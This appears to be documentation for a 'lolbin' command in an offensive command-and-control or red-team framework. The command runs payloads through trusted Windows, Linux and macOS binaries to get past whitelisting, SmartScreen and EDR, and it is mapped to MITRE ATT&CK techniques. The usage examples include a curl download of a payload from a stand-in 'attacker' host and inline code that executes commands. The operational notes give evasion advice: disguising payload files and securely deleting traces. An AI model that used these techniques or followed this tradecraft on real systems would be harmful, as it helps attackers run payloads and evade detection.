+++
title = "lolbin"
chapter = false
weight = 221
hidden = false
+++

## Summary

LOLBin/GTFOBin proxy execution — execute payloads through legitimate system binaries to bypass application whitelisting, SmartScreen, and some EDR detections. Each technique leverages a trusted binary already present on the system.

Cross-platform: Windows uses Microsoft-signed LOLBins, Linux uses GTFOBins (standard Unix utilities), macOS uses system binaries and scripting interpreters.

## Arguments

| Argument | Required | Default | Description |
|----------|----------|---------|-------------|
| action | Yes | — | Technique to use (see platform tables below) |
| path | Yes | — | Payload path, inline code, or URL (depending on action) |
| export | No | DllMain | DLL export function name (rundll32 only) |
| args | No | — | Additional arguments |

### Windows Techniques

| Action | Binary | ATT&CK | Description |
|--------|--------|--------|-------------|
| rundll32 | rundll32.exe | T1218.011 | Execute DLL export functions |
| msiexec | msiexec.exe | T1218.007 | Install/execute MSI packages silently |
| regsvcs | RegSvcs.exe | T1218.009 | .NET COM component registration |
| regasm | RegAsm.exe | T1218.009 | .NET assembly registration |
| mshta | mshta.exe | T1218.005 | Execute HTA/JavaScript/VBScript |
| certutil | certutil.exe | T1218 | Decode base64-encoded payloads |

### Linux Techniques (GTFOBins)

| Action | Binary | ATT&CK | Description |
|--------|--------|--------|-------------|
| python | python3/python | T1059.006 | Execute Python code inline (`path` = code) or from file (`args` = script path) |
| curl | curl | T1105 | Download content from URL (`path` = URL). Add `-o /tmp/file` in `args` to save |
| wget | wget | T1105 | Download content from URL (`path` = URL) |
| gcc | gcc/cc | T1027.004 | Compile and execute inline C code (`path` = C source code) |
| perl | perl | T1059 | Execute Perl code inline (`path` = code) or from file (`args` = script path) |
| ruby | ruby | T1059 | Execute Ruby code inline (`path` = code) or from file (`args` = script path) |
| node | node/nodejs | T1059.007 | Execute Node.js code inline (`path` = code) or from file (`args` = script path) |
| awk | awk/gawk/mawk | T1059 | Execute awk program (`path` = awk program, e.g., `BEGIN{system("id")}`) |

### macOS Techniques

| Action | Binary | ATT&CK | Description |
|--------|--------|--------|-------------|
| osascript | osascript | T1059.002 | Execute AppleScript or JXA (prefix code with `JXA:` for JavaScript) |
| swift | swift | T1059 | Compile and execute inline Swift code (requires Xcode CLI tools) |
| open | open | T1204.002 | Launch applications by name or open files (`-a AppName` auto-detected) |
| python | python3 | T1059.006 | Execute Python code inline or from file |
| curl | curl | T1105 | Download content from URL |

## Usage

```
# === Windows ===
# Execute a DLL export via rundll32
lolbin -action rundll32 -path C:\payload.dll -export Run

# Install MSI silently
lolbin -action msiexec -path C:\payload.msi

# .NET assembly via RegSvcs
lolbin -action regsvcs -path C:\payload.dll

# Decode base64 file via certutil
lolbin -action certutil -path C:\encoded.b64

# === Linux (GTFOBins) ===
# Run Python code inline
lolbin -action python -path 'import os; os.system("id")'

# Download a file via curl
lolbin -action curl -path http://attacker/payload -args '-o /tmp/payload'

# Compile and execute C code
lolbin -action gcc -path '#include <stdlib.h>\nint main(){system("whoami");return 0;}'

# Execute via awk
lolbin -action awk -path 'BEGIN{system("id")}'

# Run Perl one-liner
lolbin -action perl -path 'system("id")'

# === macOS ===
# Execute AppleScript
lolbin -action osascript -path 'display dialog "Hello" buttons {"OK"}'

# Execute JXA (JavaScript for Automation)
lolbin -action osascript -path 'JXA:ObjC.import("Foundation"); $.NSLog("Hello")'

# Run Swift code
lolbin -action swift -path 'import Foundation; print("Hello from Swift")'

# Launch an application
lolbin -action open -path Calculator
```

## Operational Notes

- **Windows:** All techniques use Microsoft-signed binaries. Command-line arguments visible in Sysmon EID 1. Some EDR products specifically monitor LOLBin child processes.
- **Linux:** GTFOBins are standard system utilities. Process arguments visible in `/proc` and `ps`. Interpreter execution is common on servers and may blend in.
- **macOS:** `osascript` may trigger TCC prompts. `swift` requires Xcode CLI tools (unusual on non-dev machines). `open` may produce visible UI elements.
- **All platforms:** 60-second timeout per execution. Process creation logged. Use `masquerade` to disguise payload files before execution.
- **GCC action** creates temp files in `/tmp` — clean up after use with `securedelete`.

## MITRE ATT&CK Mapping

- **T1218** — Signed Binary Proxy Execution (Windows LOLBins)
- **T1218.011** — Rundll32
- **T1218.007** — Msiexec
- **T1218.009** — Regsvcs/Regasm
- **T1218.005** — Mshta
- **T1059** — Command and Scripting Interpreter (Linux/macOS GTFOBins)
- **T1059.002** — AppleScript (osascript)
- **T1059.006** — Python
- **T1059.007** — JavaScript (Node.js)
- **T1105** — Ingress Tool Transfer (curl/wget)
- **T1027.004** — Compile After Delivery (gcc)
- **T1204.002** — User Execution: Malicious File (open)
